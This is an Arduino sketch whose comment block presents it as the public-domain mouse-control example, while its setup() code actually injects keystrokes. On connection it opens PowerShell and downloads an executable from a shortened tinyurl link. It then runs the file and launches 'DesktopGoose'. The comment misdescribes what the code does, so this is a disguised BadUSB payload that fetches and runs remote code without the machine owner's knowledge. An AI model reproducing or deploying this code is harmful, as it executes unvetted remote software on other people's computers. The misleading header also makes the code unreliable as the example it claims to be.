#include <Arduino.h>

/*
  KeyboardAndMouseControl

  Controls the mouse from five pushbuttons on an Arduino Leonardo, Micro or Due.

  Hardware:
  - five pushbuttons attached to D2, D3, D4, D5, D6

  The mouse movement is always relative. This sketch reads four pushbuttons, and
  uses them to set the movement of the mouse.

  WARNING: When you use the Mouse.move() command, the Arduino takes over your
  mouse! Make sure you have control before you use the mouse commands.

  created 15 Mar 2012
  modified 27 Mar 2012
  by Tom Igoe

  This example code is in the public domain.

  https://www.arduino.cc/en/Tutorial/BuiltInExamples/KeyboardAndMouseControl
*/

#include "Keyboard.h"
#include "Mouse.h"


void setup() { // initialize the buttons' inputs:'
  delay(2000);
  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('r');
  Keyboard.release(KEY_LEFT_GUI);
  delay(100);
  Keyboard.println("powershell");
  delay(1500);

  Keyboard.println("New-Item -Path 'c:\\temp\\' -ItemType Directory");
  delay(200);

  Keyboard.println("if(!(Test-Path \"C:\\temp\\DesktopGoose v0.3\" -PathType Any)){Invoke-WebRequest -Uri \"https://tinyurl.com/46ke8bxu\" -OutFile \"c:\\temp\\desktopGoose.exe\"}");
  delay(5000);
  Keyboard.println("if(!(Test-Path \"C:\\temp\\DesktopGoose v0.3\" -PathType Any)){c:\\temp\\desktopGoose.exe}");
  delay(200);
  Keyboard.write(KEY_TAB);
  Keyboard.write(KEY_TAB);    
  Keyboard.write(KEY_RETURN);
  delay(2000);
  Keyboard.println("C:\\temp\\\"DesktopGoose v0.3\"\\GooseDesktop.exe");
  delay(250);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.write(KEY_TAB);
  Keyboard.release(KEY_LEFT_ALT);
  delay(100);
  Keyboard.println("exit");
}

void loop() {
  delay(1000);
}
